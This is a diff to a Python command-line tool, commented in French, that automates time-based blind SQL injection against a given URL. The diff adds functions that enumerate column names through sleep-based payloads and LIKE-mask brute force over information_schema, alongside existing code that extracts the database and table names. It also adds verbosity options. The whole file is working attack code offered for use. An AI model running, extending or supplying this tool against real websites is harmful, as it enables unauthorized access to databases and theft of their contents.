@@ -13,6 +13,14 @@ ascii_art = """\033[91m
 ╚════██║██║▄▄ ██║██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  
 ███████║╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║███████╗██║     ██║  ██║╚██████╔╝██████╔╝███████╗
 ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
+-----------------------------------------------------------------------------------------------
+|           ____           ____                         _                                     |
+|          / __ )__  __   / __ \_________ _____  ____ _(_)_  ____________                     |
+|         / __  / / / /  / / / / ___/ __ `/ __ \/ __ `/ / / / / ___/ ___/                     |
+|        / /_/ / /_/ /  / /_/ / /  / /_/ / / / / /_/ / / /_/ (__  |__  )                      |
+|       /_____/\__, /   \____/_/   \__,_/_/ /_/\__, /_/\__,_/____/____/                       |
+|             /____/                          /____/                                          |
+-----------------------------------------------------------------------------------------------
     \033[0m                                                                                          
 """
 
@@ -51,6 +59,9 @@ def print_green(text):
 def print_blue(text):
     print(f"{colors.BLUE}{text}{colors.END}")
 
+def print_blueb(text):
+    print(f"{colors.BLUE_BOLD}{text}{colors.END}")
+
 # Découpe une chaîne de caractères en deux parties lorsqu'il y a FUZZ.
 def split_at_fuzz(input_string):
     parts = input_string.split("FUZZ")
@@ -67,12 +78,6 @@ def add_payload(input_string, payload):
 # Encode une chaîne de caractères conformément aux spécifications URL.
 def urlencode(string_to_encode):
     return urllib.parse.quote(string_to_encode)
-
-# Encode une chaîne de caractères entre <@urlencode> et </@urlencode> conformément aux spécifications URL.
-# def urlencode_in_tags(input_string):
-#     def encode_match(match):
-#         return urlencode(match.group(1))
-#     return re.sub(r'<@urlencode>(.*?)</@urlencode>', encode_match, input_string)
 
 def urlencode_in_tags(input_string):
     return re.sub(r'<@urlencode>(.*?)<@/urlencode>', lambda x: f"{urllib.parse.quote(x.group(1))}", input_string)
@@ -95,7 +100,7 @@ def check_response_time(response_time):
     else:
         return False
 
-def verify(url, params):
+def verify(url, params, verbose=0):
     print_blue('[X] Verification of SQL Time-Based injection for ' + url)
     params=add_payload(params, verif_payload)
     params=urlencode_in_tags(params)
@@ -132,7 +137,37 @@ def attack_get_length(url, params, database=True, fuzz="pass"):
     print_redb('[-] Error: Length >20 caracters')
     return -1
 
-def attack_get_information(url, params, length, database_name="", database=True, fuzz="pass"):
+def attack_get_column_length(url, params, table, fuzz="pass"):
+    query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '{mask}' limit 0,1) like '" + table + "'"
+    for i in range(1, 51):
+        for j in range(1, 50):
+            mask = '_' * i + fuzz + '_' * j
+            query = query_template.format(mask=mask)
+            if attack_one_payload(url,params, query):
+                return mask, len(mask)
+    print_redb('[-] Error: Length >40 caracters')
+    return -1
+
+def attack_get_column(url, params, length, table, mask_with_fuzz, column_name="", i=1, verbose=0):
+    query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '{mask}' limit 0,1) like '" + table + "'"
+    d = "column"
+    for char in ALPHABET:
+        mask = column_name + char + mask_with_fuzz[i:]
+        query = query_template.format(mask=mask)
+        if verbose > 2:
+            print(query)
+        if attack_one_payload(url, params, query):
+            if length == 1:
+                return char
+            else:
+                if verbose>=1:
+                    print_greenb("[+] Retrieve "+ d + " name for table "+table+" : Length " + str(length) + ", Step retrieve :" + mask)
+                i=i+1
+                return char + attack_get_column(url, params, length - 1, table, mask_with_fuzz, column_name+char, i=i)
+    print_redb('[-] Erreur: Caracter not in alphabet')
+    return " "
+
+def attack_get_information(url, params, length, database_name="", database=True, fuzz="pass", verbose=0):
     if database:
         query_template = "select sleep(2) from dual where database() like '{mask}'"
         d="database"
@@ -142,16 +177,19 @@ def attack_get_information(url, params, length, database_name="", database=True,
     for char in ALPHABET:
         mask = database_name + char + '_' * (length - 1)
         query = query_template.format(fuzz=fuzz,mask=mask)
+        if verbose > 2:
+            print(query)
         if attack_one_payload(url, params, query):
             if length == 1:
                 return char
             else:
-                print_greenb("[+] Retrieve "+ d + " name : Length " + str(length) + ", Step retrieve :" + mask)
+                if verbose>=1:
+                    print_greenb("[+] Retrieve "+ d + " name : Length " + str(length) + ", Step retrieve :" + mask)
                 return char + attack_get_information(url, params, length - 1, database_name+char, database, fuzz=fuzz)
     print_redb('[-] Erreur: Caracter not in alphabet')
     return " "
 
-def attack_main(url, params):
+def attack_main(url, params, verbose=0):
     print_blue('[X] Retrieving the database name via SQL Time-Based injection via ' + url)
     print_blue("[X] Retrieve database name length")
     database_length = attack_get_length(url, params)
@@ -162,17 +200,28 @@ def attack_main(url, params):
     print_blue("[X] Retrieve database name")
     database_name = attack_get_information(url, params, database_length)
     print_greenb("[+] Database name : " + database_name)
-    for table in TABLES_FUZZING:
+    for fuzz in TABLES_FUZZING:
         print_blue("[X] Retrieve tables names")
-        print_blue("[X] Retrieve table name length (" + table + ")")
-        pass_length = attack_get_length(url, params, False, table)
-        if pass_length != -1:
-            print_greenb("[+] Table name length : " + str(pass_length))
+        print_blue("[X] Retrieve table name length (Column fuzz:" + fuzz + ")")
+        table_length = attack_get_length(url, params, False, fuzz)
+        if table_length != -1:
+            print_greenb("[+] Table name length : " + str(table_length))
         else:
             return -1
         print_blue("[X] Retrieve table name")
-        password = attack_get_information(url, params, pass_length, "",False, table)
-        print_greenb("[+] Table : " + password)
+        table = attack_get_information(url, params, table_length, "",False, fuzz)
+        print_greenb("[+] Table : " + table)
+        print_blue("[X] Retrieve table column for table " + table)
+        print_blue("[X] Retrieve table column length for table " + table)
+        mask, column_length = attack_get_column_length(url, params, table, fuzz)
+        if column_length != -1:
+            print_greenb("[+] Column name length : " + str(column_length))
+            print_greenb("[+] Retrieve column name for table "+table+" : Length " + str(column_length) + ", Step retrieve :" + mask)
+        else:
+            return -1
+        column=attack_get_column(url, params, column_length, table, mask)
+        print_greenb("[+] Column in table " + table + " : " + column)
+        
 
 print(ascii_art)
 
@@ -184,8 +233,14 @@ parser.add_argument("-p", "--params", help="Request parameters (format 'test=1&t
 parser.add_argument("-a", "--attack", action="store_true", help="Retrieve information in the database")
 parser.add_argument("-V", "--verify", action="store_true", help="Verify Time-Based SQL Injection")
 parser.add_argument("-c", "--cookies", help="Cookies to include in the request (format 'cookie1=value1;cookie2=value2')")
+parser.add_argument("-v", "--verbose", action="count", default=0, help="Increase output verbosity")
 args = parser.parse_args()
 
+# Verbose levels
+if args.verbose == 1:
+    print_blueb("[+] Verbose mode enabled.")
+elif args.verbose > 1:
+    print_blueb("[+] Debug mode enabled.")
 
 # Si mode interactif est activé
 if args.interactive:
@@ -198,10 +253,10 @@ elif args.url and args.params:
     attack = args.attack
     cookies = args.cookies
     if args.verify:
-        verify(url, params)
+        verify(url, params,args.verbose)
     if args.attack:
-        verify(url, params)
-        attack_main(url, params)
+        verify(url, params,args.verbose)
+        attack_main(url, params, args.verbose)
 else:
     print("Veuillez utiliser -i pour le mode interactif ou -u pour l'URL et -p pour les paramètres.")
     exit()
